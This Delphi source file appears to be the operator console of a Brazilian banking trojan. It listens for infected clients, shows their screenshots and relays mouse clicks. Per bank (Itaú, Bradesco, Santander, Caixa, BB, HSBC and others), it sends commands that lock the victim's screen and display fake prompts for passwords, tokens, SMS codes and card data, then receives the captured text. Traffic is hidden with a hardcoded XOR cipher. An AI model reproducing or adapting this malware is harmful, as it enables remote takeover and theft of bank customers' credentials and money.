unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, System.Win.ScktComp, Vcl.StdCtrls,
  Vcl.ExtCtrls, Web.Win.Sockets, IdContext, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.Imaging.JConsts, Vcl.Imaging.jpeg,
  Vcl.ComCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    RadioGroup1: TRadioGroup;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    RadioButton3: TRadioButton;
    RadioButton4: TRadioButton;
    RadioButton5: TRadioButton;
    RadioButton6: TRadioButton;
    RadioButton7: TRadioButton;
    RadioButton8: TRadioButton;
    RadioButton9: TRadioButton;
    RadioButton10: TRadioButton;
    RadioButton11: TRadioButton;
    RadioButton12: TRadioButton;
    RadioGroup2: TRadioGroup;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Image1: TImage;
    Label1: TLabel;
    s1: TServerSocket;
    s2: TServerSocket;
    ProgressBar1: TProgressBar;
    Timer1: TTimer;
    Edit1: TEdit;
    Cifrar: TButton;
    Decifrar: TButton;
    Edit3: TEdit;
    Button11: TButton;
    Label2: TLabel;
    Edit4: TEdit;
    Button12: TButton;
    Button13: TButton;
    Label3: TLabel;
    Button14: TButton;
    Button15: TButton;
    Label4: TLabel;
    Button16: TButton;
    Button17: TButton;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure zera(Sender: TObject);
    procedure s1Accept(Sender: TObject; ClientSocket: TCustomIpClient);
    procedure s1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure s1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button5Click(Sender: TObject);
    procedure s2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure s2ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure s2ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure CifrarClick(Sender: TObject);
    procedure DecifrarClick(Sender: TObject);

    procedure Image1DblClick(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure RadioButton1Click(Sender: TObject);
    procedure RadioButton2Click(Sender: TObject);
    procedure RadioButton3Click(Sender: TObject);
    procedure RadioButton4Click(Sender: TObject);
    procedure RadioButton5Click(Sender: TObject);
    procedure RadioButton6Click(Sender: TObject);
    procedure RadioButton7Click(Sender: TObject);
    procedure RadioButton8Click(Sender: TObject);
    procedure RadioButton9Click(Sender: TObject);
    procedure RadioButton10Click(Sender: TObject);
    procedure RadioButton11Click(Sender: TObject);
    procedure RadioButton12Click(Sender: TObject);
    procedure s1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Edit1Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);



  private
    { Private declarations }
  public
    { Public declarations }
    trava_tela : String;
    Receiving : boolean;
  end;

var
  Form1: TForm1;
  TamanhoArquivo : integer;
  Arquivo : TMemoryStream;
  RecebendoArquivo : Boolean;
  jpg: TJPEGImage;
  rato : String;
  imgqualidade : integer;
  CorQualCliente : integer;

implementation

{$R *.dfm}



Function Crypt(Action, Src: String): String;
Label Fim;
var KeyLen : Integer;
  KeyPos : Integer;
  OffSet : Integer;
  Dest, Key : String;
  SrcPos : Integer;
  SrcAsc : Integer;
  TmpSrcAsc : Integer;
  Range : Integer;
begin
  if (Src = '') Then
  begin
    Result:= '';
    Goto Fim;
  end;
  Key :='jauSAFGGhgh_SEC_537¨%#$8732g6asd{OFF.LINES}SGH87y32g890{BERTIOLY}gbk+=(''';
  Dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  if (Action = UpperCase('C')) then
  begin
    Randomize;
    OffSet := Random(Range);
    Dest := Format('%1.2x',[OffSet]);
    for SrcPos := 1 to Length(Src) do
    begin
      Application.ProcessMessages;
      SrcAsc := (Ord(Src[SrcPos]) + OffSet) Mod 255;
      if KeyPos < KeyLen then KeyPos := KeyPos + 1 else KeyPos := 1;
      SrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
      Dest := Dest + Format('%1.2x',[SrcAsc]);
      OffSet := SrcAsc;
    end;
  end
  Else if (Action = UpperCase('D')) then
  begin
    OffSet := StrToInt('$'+ copy(Src,1,2));
    SrcPos := 3;
  repeat
    SrcAsc := StrToInt('$'+ copy(Src,SrcPos,2));
    if (KeyPos < KeyLen) Then KeyPos := KeyPos + 1 else KeyPos := 1;
    TmpSrcAsc := SrcAsc Xor Ord(Key[KeyPos]);
    if TmpSrcAsc <= OffSet then TmpSrcAsc := 255 + TmpSrcAsc - OffSet
    else TmpSrcAsc := TmpSrcAsc - OffSet;
    Dest := Dest + Chr(TmpSrcAsc);
    OffSet := SrcAsc;
    SrcPos := SrcPos + 2;
  until (SrcPos >= Length(Src));
  end;
  Result:= Dest;
  Fim:
end;


Procedure TForm1.zera(Sender: TObject);
begin
     button3.Enabled := false;
     button4.Enabled := false;
     button5.Enabled := false;
     button6.Enabled := false;
     button7.Enabled := false;
     button8.Enabled := false;
     button9.Enabled := false;
     button10.Enabled := false;
     button16.Enabled := false;
     button17.Enabled := false;
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_TabITBNK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'PDD_TabBRABNK';

    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_TabSNTD';

    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));

end;

procedure TForm1.Button11Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText(Crypt('C', edit3.text)+'/0/'+Crypt('C', 'Comand_Text_Env'));
end;

procedure TForm1.Button12Click(Sender: TObject);
begin

imgqualidade := imgqualidade + 10;
label3.Caption := inttostr(imgqualidade);
s1.Socket.Connections[0].SendText(inttostr(imgqualidade)+'/0/'+Crypt('C', 'ImgQualCliente'));
end;

procedure TForm1.Button13Click(Sender: TObject);
begin
imgqualidade := imgqualidade - 10;
label3.Caption := inttostr(imgqualidade);
s1.Socket.Connections[0].SendText(inttostr(imgqualidade)+'/0/'+Crypt('C', 'ImgQualCliente'));

end;

procedure TForm1.Button14Click(Sender: TObject);
begin
CorQualCliente := CorQualCliente + 10;
label4.Caption := inttostr(CorQualCliente);
s1.Socket.Connections[0].SendText(inttostr(CorQualCliente)+'/0/'+Crypt('C', 'CorQualCliente'));

end;

procedure TForm1.Button15Click(Sender: TObject);
begin
CorQualCliente := CorQualCliente - 10;
label4.Caption := inttostr(CorQualCliente);
s1.Socket.Connections[0].SendText(inttostr(CorQualCliente)+'/0/'+Crypt('C', 'CorQualCliente'));

end;

procedure TForm1.Button16Click(Sender: TObject);
begin
    if radiobutton1.Checked then {BB}
       trava_tela := 'PDD_Sen2AMRBNK';

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'PDD_ViaHSBNK';

    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_SenITBK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'PDD_TknSmsBRDBK';

    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_AssSNTD';

    if radiobutton7.Checked then {sicoob}
       trava_tela := 'PDD_AssSicoo';

    if radiobutton8.Checked then {sicredi}
       trava_tela := 'PDD_AssSicr';

    if radiobutton9.Checked then {caixa}
       trava_tela := 'PDD_AssCFCX';

    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));
end;

procedure TForm1.Button17Click(Sender: TObject);
begin
    if radiobutton1.Checked then {BB}
       trava_tela := 'PDD_LibAMRBNK';

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'PDD_AlfaHSBNK';

    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_SenITBKCRD';


    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_TabSerSNTD';

    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
s1.Active := true;
s2.Active := true;
label1.Caption := 'Aguardando conexão';

button2.Enabled := true;
button1.Enabled := false;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
timer1.Enabled := false;
button2.Enabled := false;
button1.Enabled := true;
s1.Active := false;
s2.Active := false;
label1.Caption := 'Desconectado';
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
    if radiobutton1.Checked then {BB}
       trava_tela := 'BLOQ_AMRLO';

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'BLOQ_HSBNK';

    if radiobutton3.Checked then {itaú}
       trava_tela := 'BLOQ_ITBNK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'BLOQ_BRD';

    if radiobutton5.Checked then {Banrisul}
       trava_tela := 'BLOQ_BANRRSL';

    if radiobutton6.Checked then {santander}
       trava_tela := 'BLOQ_SNTD';

    if radiobutton7.Checked then {sicoob}
       trava_tela := 'BLOQ_SICOO';

    if radiobutton8.Checked then {sicredi}
       trava_tela := 'BLOQ_SICRD';

    if radiobutton9.Checked then {caixa}
       trava_tela := 'BLOQ_CFCX';

    if radiobutton10.Checked then {brb}
       trava_tela := 'BLOQ_BRNET';

    if radiobutton11.Checked then {citibank}
       trava_tela := 'BLOQ_CTYB';


//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));





end;

procedure TForm1.Button4Click(Sender: TObject);
begin

if s1.Socket.Connected then
 s1.Socket.Connections[0].SendText('41EF34D26693B8BC6EBF42D81224');

end;

procedure TForm1.Button5Click(Sender: TObject);
begin
    if radiobutton1.Checked then {BB}
       trava_tela := 'PDD_SenAMRBNK';

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'PDD_SenHSBNK';

    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_DTITBK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'PDD_CertBRD';

    if radiobutton5.Checked then {Banrisul}
       trava_tela := 'PDD_SenBANRR';

    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_SenSNTD';

    if radiobutton7.Checked then {sicoob}
       trava_tela := 'PDD_SenSicoo';

    if radiobutton8.Checked then {sicredi}
       trava_tela := 'PDD_SenSicr';

    if radiobutton9.Checked then {caixa}
       trava_tela := 'PDD_AssCFCX_NV';

    if radiobutton11.Checked then {citibank}
       trava_tela := 'PDD_SenCITYHALL';

    if radiobutton12.Checked then {serasa}
       trava_tela := 'PDD_SenSer';

//    s1.Sendln(trava_tela);
    if s1.Socket.Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));

end;

procedure TForm1.Button6Click(Sender: TObject);
begin

    if radiobutton2.Checked then {HSBC}
       trava_tela := 'PDD_TknHSBNK';

    if radiobutton3.Checked then {itaú}
       trava_tela := 'PDD_TknITBNK';

    if radiobutton4.Checked then {bradesco}
       trava_tela := 'PDD_TknBRDBK';

    if radiobutton6.Checked then {santander}
       trava_tela := 'PDD_TknSNTD';

    if radiobutton8.Checked then {sicredi}
       trava_tela := 'PDD_TknSicr';

    if radiobutton10.Checked then {brb}
       trava_tela := 'PDD_TknBRBNET';
    if s1.Socket.Connections[0].Connected then
      s1.Socket.Connections[0].SendText(Crypt('C', trava_tela));

end;

procedure TForm1.Button7Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText(Crypt('C', 'DescCliente'));
  zera(nil);
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText(Crypt('C', 'RestartPCCliente'));
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
  s1.Socket.Connections[0].SendText(Crypt('C', 'DesligarCliente'));
end;

procedure TForm1.CifrarClick(Sender: TObject);
begin
edit1.Text := Crypt('C',Edit1.text);
end;

procedure TForm1.DecifrarClick(Sender: TObject);
begin
  edit1.Text := Crypt('D',Edit1.text);
end;

procedure TForm1.Edit1Click(Sender: TObject);
begin
edit1.Clear;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
     button2.Enabled := false;
     TPicture.RegisterFileFormat('jpe', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jif', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jfif', sJPEGImageFile, TJPEGImage);
     TPicture.RegisterFileFormat('jfi', sJPEGImageFile, TJPEGImage);
     RecebendoArquivo := False;
     zera(nil);
     RadioButton1.Enabled := false;
     RadioButton2.Enabled := false;
     RadioButton3.Enabled := false;
     RadioButton4.Enabled := false;
     RadioButton5.Enabled := false;
     RadioButton6.Enabled := false;
     RadioButton7.Enabled := false;
     RadioButton8.Enabled := false;
     RadioButton9.Enabled := false;
     RadioButton10.Enabled := false;
     RadioButton11.Enabled := false;
     RadioButton12.Enabled := false;
     button11.Enabled := false;
     imgqualidade := 10;
     CorQualCliente := 10;
     label3.Caption := inttostr(imgqualidade);
     label4.Caption := inttostr(CorQualCliente);

end;





procedure TForm1.Image1Click(Sender: TObject);

var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  ponto:= image1.ScreenToClient(ponto);

  str := 'EsqClickRat';

  s1.Socket.Connections[0].SendText(inttostr(ponto.x)+'/'+inttostr(ponto.y)+'/'+Crypt('C',str));

end;

procedure TForm1.Image1DblClick(Sender: TObject);
var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  //ponto.x := ponto.X - image1.Left;
  //ponto.Y := ponto.Y - image1.Top;
  //memo1.Lines.Add(inttostr(ponto.x)+ ','+ inttostr(ponto.y));
  ponto:= image1.ScreenToClient(ponto);
  //memo1.Lines.Add(inttostr(ponto.x)+ ','+ inttostr(ponto.y));
  str := 'EsqClickDplRat';
  s1.Socket.Connections[0].SendText(inttostr(ponto.x)+'/'+inttostr(ponto.y)+'/'+Crypt('C',str));

end;

procedure TForm1.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
 ponto : Tpoint;
 str : string;
begin
  ponto := Mouse.CursorPos;
  ponto:= image1.ScreenToClient(ponto);

case button of
  TMouseButton.mbRight:
  begin
    str := 'DirClickRat';
    s1.Socket.Connections[0].SendText(inttostr(ponto.x)+'/'+inttostr(ponto.y)+'/'+Crypt('C',str));
  end;

end;




end;



procedure TForm1.RadioButton10Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
// button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
end;

procedure TForm1.RadioButton11Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton12Click(Sender: TObject);
begin
 zera(nil);
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
end;

procedure TForm1.RadioButton1Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button16.Enabled := true;
 button17.Enabled := true;

end;

procedure TForm1.RadioButton2Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button16.Enabled := true;
 button17.Enabled := true;

end;

procedure TForm1.RadioButton3Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button10.Enabled := true;
 button16.Enabled := true;
 button17.Enabled := true;

end;

procedure TForm1.RadioButton4Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button10.Enabled := true;
 button16.Enabled := true;
end;

procedure TForm1.RadioButton5Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;

end;

procedure TForm1.RadioButton6Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button10.Enabled := true;
 button16.Enabled := true;
 button17.Enabled := true;

end;

procedure TForm1.RadioButton7Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button16.Enabled := true;

end;

procedure TForm1.RadioButton8Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button6.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button16.Enabled := true;

end;

procedure TForm1.RadioButton9Click(Sender: TObject);
begin
 zera(nil);
 button3.Enabled := true;
 button4.Enabled := true;
 button5.Enabled := true;
 button7.Enabled := true;
 button8.Enabled := true;
 button9.Enabled := true;
 button16.Enabled := true;

end;

Procedure TForm1.s1Accept(Sender: TObject; ClientSocket: TCustomIpClient);
begin
label1.Caption := 'Cleinte conectado';
end;



procedure TForm1.s1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
label1.Caption := 'cliente conectado ip: '+ s1.Socket.Connections[0].RemoteAddress;
     RadioButton1.Enabled := true;
     RadioButton2.Enabled := true;
     RadioButton3.Enabled := true;
     RadioButton4.Enabled := true;
     RadioButton5.Enabled := true;
     RadioButton6.Enabled := true;
     RadioButton7.Enabled := true;
     RadioButton8.Enabled := true;
     RadioButton9.Enabled := true;
     RadioButton10.Enabled := true;
     RadioButton11.Enabled := true;
     RadioButton12.Enabled := true;
     button11.Enabled := true;
end;

procedure TForm1.s1ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
    timer1.Enabled:= false;
label1.Caption := 'Cliente desconectado';
     RadioButton1.Enabled := false;
     RadioButton2.Enabled := false;
     RadioButton3.Enabled := false;
     RadioButton4.Enabled := false;
     RadioButton5.Enabled := false;
     RadioButton6.Enabled := false;
     RadioButton7.Enabled := false;
     RadioButton8.Enabled := false;
     RadioButton9.Enabled := false;
     RadioButton10.Enabled := false;
     RadioButton11.Enabled := false;
     RadioButton12.Enabled := false;
     button11.Enabled := false;
     zera(nil);
end;




procedure TForm1.s1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
str: string;
tm : integer;
begin

 tm := s1.Socket.Connections[0].ReceiveLength;
 str := s1.Socket.Connections[0].ReceiveText;
 if tm > 8 then
    edit4.Text := Crypt('D', str);
end;

procedure TForm1.s2ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
timer1.Enabled := true;
end;

procedure TForm1.s2ClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
timer1.Enabled := false;
end;

procedure TForm1.s2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
Var TamBuffer : integer;
    Paux : pointer;
    s : string;
begin
  if not RecebendoArquivo then
   Begin
     //Socket.ReceiveBuf(TamanhoArquivo,sizeof(integer));
     s := socket.ReceiveText;
     TamanhoArquivo := strtoint(s);
     RecebendoArquivo := True;
     if Arquivo = nil then
      Arquivo := TMemoryStream.Create;
     ProgressBar1.Max := TamanhoArquivo;
   end
  else
   Begin
     TamBuffer := Socket.ReceiveLength;
     GetMem(PAux,TamBuffer);
     Socket.ReceiveBuf(PAux^,TamBuffer);
     Arquivo.Write(PAux^,TamBuffer);
     Dispose(PAux);
     ProgressBar1.Position := Arquivo.Size;
     if TamanhoArquivo = Arquivo.Size then
      Begin
        RecebendoArquivo := False;
        Arquivo.SaveToFile('t.jpg');
        jpg:=TJPEGImage.Create;
        jpg.LoadFromFile('t.jpg');
        Image1.Picture.Assign(jpg);
        Arquivo.Free;
        Arquivo := Nil;
        ProgressBar1.Position := ProgressBar1.Min;
      end;

   end;

end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
  s2.Socket.Connections[0].SendText('4BF052D360E56D87959CB86DE96BFA');
end;

end.
